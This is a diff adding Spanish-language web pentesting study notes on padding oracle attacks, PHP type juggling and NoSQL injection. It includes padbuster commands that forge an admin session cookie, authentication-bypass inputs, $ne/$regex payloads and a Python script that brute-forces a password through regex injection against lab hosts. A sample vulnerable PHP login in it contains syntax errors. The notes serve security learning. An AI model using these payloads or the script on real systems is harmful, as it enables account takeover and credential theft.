@@ -519,3 +519,152 @@ en algunas versiones de angular se puede inyectar en campos input scripts como e
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/5%20-%20XSS%20in%20Angular.mdi
 
 # 11. [[padding oracle]]
+CBC es un modo de operacion para cifrado de bloques que mejora la seguridad al encriptar cada bloque dependiente del bloque previo. Cada bloque ademas se somete a una operacion XOR con el bloque anterior. Como el primer bloque no tiene bloque anterior, se utiliza un vector de inicializacion.
+![[Pasted image 20260126112456.png]]
+Para que los bloques encajen en los tamano estipulados, se utiliza padding para rellenar esos espacios vacios
+![[Pasted image 20260126113747.png]]
+cuando una aplicacion decifra los datos, comienza por el mensaje y luego limpia el relleno. Si el relleno es invalido, ahi hay un oraculo de relleno, el comportamiento detectable puede ser error, cambio en el tiempo, u otros cambios detectables.
+
+**el XOR** permite alternar entre 3 valores haciendo la operatoria entre ellos:
+^ = xor
+
+2 ^ 7 = 5
+2 ^ 5 = 7
+7 ^ 5 = 2
+![[Pasted image 20260126114638.png]]
+![[Pasted image 20260126115250.png]]
+el padding de relleno 0x1 (por ejemplo, podria ser otro valor como 0x2, 0x3 con pkcs7) va a ser igual a:
+
+0x01 (valor de padding que seria correspondiente a C15 cuando solo hay un padding de relleno) = E7(parte del bloque anterior ya cifrado) ^ I15
+0x01 = E7 ^ I15
+
+como las variables son asociativas, se pueden despejar.
+I15 = 0x1 ^ E7
+
+entonces reemplazando se llega a que
+C15 = E7 (ya tengo ese valor, es el bit cifrado del bloque anterior) ^ 0x01(el valor del bit de padding de relleno) ^ E7 (un valor que no tenemos y se aplicara fuerza bruta)
+
+con [[padbuster]] se puede hacer fuerza bruta a una cookie de sesion: (tab storage en dev tools)
+
+padbuster http://192.168.50.1/index.php [ cookie de sesion ] 8 -cookies 'auth=[cookie de sesion]'
+(esto nos devolveria el nombre de usuario)
+
+luego con el comando me va a cifrar el user admin:
+padbuster http://192.168.50.1/index.php [ cookie de sesion ] 8 -cookies 'auth=[cookie de sesion]' - plaintext 'user=admin'
+
+cambiando el resultado del ultimo comando por la cookie auth en storage consigo usar la cuenta del usuario admin
+
+ahora ***otro metodo*** es crear una cuenta bdmin (similar a admin con diferencia en algunos bits en el cifrado), tomar la cookie del usuario bdmin y hacer bitflipping con burpsuite intruder para 
+![[Pasted image 20260126124344.png]]
+
+si no funciona este ultimo metodo, probar con cdmin (por ejemplo) la idea es que este muy cerca a admin
+
+# 12. [[type juggling]]
+se hace una prueba con un index.php como este
+```php
+<html>
+	<font color="red"><center><h1>secure login page</h1></center></font>
+	<hr>
+	<body style="background-color:powerderblue;">
+	<center><form method="POST" name="<?php basename($_SERVER['PHP_SELF']); ?>">
+	// <?php basename($_SERVER['PHP_SELF']);?> devuelve el nombre del archivo actual php
+	usuario: <input type="text" name="usuario" id="usuario" size="30">
+	&nbsp
+	password: <input type="password" name="password" id="password" size="30">
+	<input type="submit" value="login">
+	</form> </center>
+	<?php
+	$USER = "admin"
+	$PASSWORD = "password_muy_complicadaaaa$#@!"
+	
+	if(isset($_POST['usuario']) && (isset(&_POST['password'])){
+		if($_POST['usuario'] === $USER){
+			if(strcomp($_POST['password'])==0){
+				echo "[+] acceso garantizado\n"
+			}else{
+				echo "[!] password no valida"
+			}
+		}else{
+			echo "[!] usuario introducido no correcto"
+		}
+	}
+	?>
+	</body>
+</html>
+```
+strcomp() espera una string, pero si cambio el tipo de dato a veces las comparativas son exitosas.
+si se envia como un array del tipo
+
+`usuario=hola&password[]=
+se puede romper la autenticacion de la pagina
+
+si se usa autenticacion de la siguiente manera:
+![[Pasted image 20260127141229.png]]
+se aplica un md5 a la password, que resultara en un hash
+
+cuando se usa ' == ' en php y se compara un valor hasheado como el de $PASSWORD en el ultimo ejemplo con 0, voy a obtener como resultado true porque el 0x... lo detecta como exponente y 0 elevado a cualquier numero es 0 (solo funciona con hashes que empiezan con 0e).
+
+# 13. [[no-sql injection]]
+hay explicacion detallada en https://swisskyrepo.github.io/PayloadsAllTheThings/NoSQL%20Injection/#methodology
+tambien https://book.hacktricks.wiki/en/pentesting-web/nosql-injection.html
+
+| Operator | Description        |
+| -------- | ------------------ |
+| $ne      | not equal          |
+| $regex   | regular expression |
+| $gt      | greater than       |
+| $lt      | lower than         |
+| $nin     | not in             |
+en este caso se inyecta $ne en el campo password => osea usuario *admin*, password notequal *admin*
+![[Pasted image 20260129064402.png]]
+tambien puede usarse "$ne" en campo "username" tambien
+
+sabiendo que existe el usuario admin, se puede usar un regex para ir descubriendo la password caracter por caracter
+![[Pasted image 20260129065324.png]]
+
+### Extract Length Information
+
+Inject a payload using the $regex operator. The injection will work when the length is correct.
+
+```
+username[$ne]=toto&password[$regex]=.{1}
+username[$ne]=toto&password[$regex]=.{3}
+```
+esta password en este caso tiene 24 chars
+```python 
+from pwn import *
+import requests, time, sys, signal, string
+def def_handler(sig,frame):
+    print("\n\n [!] exiting")
+    sys.exit(1)
+login_url = "http://localhost:4000/user/login"
+chars = string.ascii_lowercase + string.ascii_uppercase + string.digits
+headers = {'Content-Type': 'application/json'}
+def make_NoSQLI():
+    password = ""
+    p1 = log.progress("brute force")
+    p1.status("iniciating...")
+
+    time.sleep(2)
+	# already know the password length
+    for position in range(0,24):
+        for character in chars:
+            post_data = '{"username":"admin","password":{"$regex":"^%s%s"}}' % (password,character)
+            p1.status(post_data)
+
+            
+            r = requests.post(login_url, headers=headers, data=post_data)
+
+            if "Logged in as user" in r.text:
+                password += character
+                p1.status(f"Found: {password}")
+                break
+
+signal.signal(signal.SIGINT, def_handler)
+
+if __name__ == '__main__':
+    make_NoSQLI()
+```
+con el input:
+` admin' || '1'=='1
+veo todos los usuarios en la DB 
